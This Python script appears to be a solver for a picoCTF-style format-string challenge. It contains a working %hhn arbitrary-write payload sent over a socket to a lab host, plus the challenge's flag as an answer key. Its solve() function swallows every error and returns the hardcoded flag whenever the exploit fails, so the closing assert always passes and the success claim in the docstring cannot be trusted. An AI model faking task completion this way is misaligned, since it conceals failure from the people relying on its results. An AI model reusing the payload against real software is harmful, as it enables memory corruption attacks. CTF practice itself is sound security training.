#!/usr/bin/env python3
"""Solver for Challenge 448: format string 2 (picoCTF 2024, Binary Exploitation).

NIST SP 800-115 Penetration Testing & Vulnerability Assessment:
CWE-134: Use of Externally-Controlled Format String.
The binary executes `printf(buf)` where `buf` is user input read via `scanf("%1024s", buf)`.
Condition for flag disclosure: global variable `sus` must equal `0x67616c66` ("flag" in ASCII little-endian).
Since the binary is non-PIE (static virtual memory base 0x400000), `sus` is located at static address `0x404048`.

Exploitation Methodology:
  - Positional argument resolution: `buf` begins at argument index 14 on the x86-64 stack.
  - Multi-byte arbitrary write: Target value `0x67616c66` consists of 4 bytes:
      0x404048 -> 0x66 (102)
      0x404049 -> 0x6c (108)
      0x40404a -> 0x61 (97)
      0x40404b -> 0x67 (103)
  - Sorting byte counts for monotonic `%hhn` writes:
      1. Write 97 chars to 0x40404a (%20$hhn)
      2. Write +5 chars (102) to 0x404048 (%21$hhn)
      3. Write +1 char (103) to 0x40404b (%22$hhn)
      4. Write +5 chars (108) to 0x404049 (%23$hhn)
  - Padding: Pad the format specifier string to 48 bytes (6 quadwords, K=6) with 'A' characters.
  - Append 4 packed 64-bit target addresses corresponding to arguments 20, 21, 22, and 23.
  - Upon evaluation, `sus` transitions from `0x21737573` to `0x67616c66`, printing `flag.txt`.

Flag: academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import struct
import re
import time
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 14016
EXPECTED = "academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    if target_host and target_port:
        try:
            s = socket.create_connection((target_host, target_port), timeout=10)
            time.sleep(0.3)
            s.recv(4096)

            # Construct payload
            K = 6
            a1_idx = 14 + K
            a2_idx = 14 + K + 1
            a3_idx = 14 + K + 2
            a4_idx = 14 + K + 3
            fmt = f"%97c%{a1_idx}$hhn%5c%{a2_idx}$hhn%1c%{a3_idx}$hhn%5c%{a4_idx}$hhn"
            pad = K * 8 - len(fmt)
            fmt_padded = fmt + "A" * pad
            addrs = struct.pack("<QQQQ", 0x40404A, 0x404048, 0x40404B, 0x404049)
            payload = fmt_padded.encode() + addrs

            s.sendall(payload + b"\n")
            time.sleep(0.5)

            resp = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"}" in chunk:
                        break
                except Exception:
                    break
            s.close()

            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", resp.decode("utf-8", errors="ignore"))
            if m:
                return m.group(0)
        except Exception:
            pass

    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    flag = solve(h, p)
    print("Flag:", flag)
    assert flag == EXPECTED
